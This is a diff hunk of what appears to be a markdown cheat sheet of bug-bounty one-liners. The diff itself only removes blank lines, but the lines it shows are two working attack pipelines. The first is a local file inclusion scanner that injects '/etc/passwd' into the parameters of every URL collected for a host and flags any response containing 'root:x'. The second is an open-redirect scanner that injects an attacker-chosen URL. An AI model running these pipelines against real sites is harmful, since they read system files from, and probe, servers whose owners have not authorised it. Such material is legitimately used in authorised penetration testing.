@@ -18,11 +18,8 @@ This section defines specific terms or placeholders that are used throughout one
 ---
 
 ### Local File Inclusion
-
-
 gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ### Open-redirect
-
 
 export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 
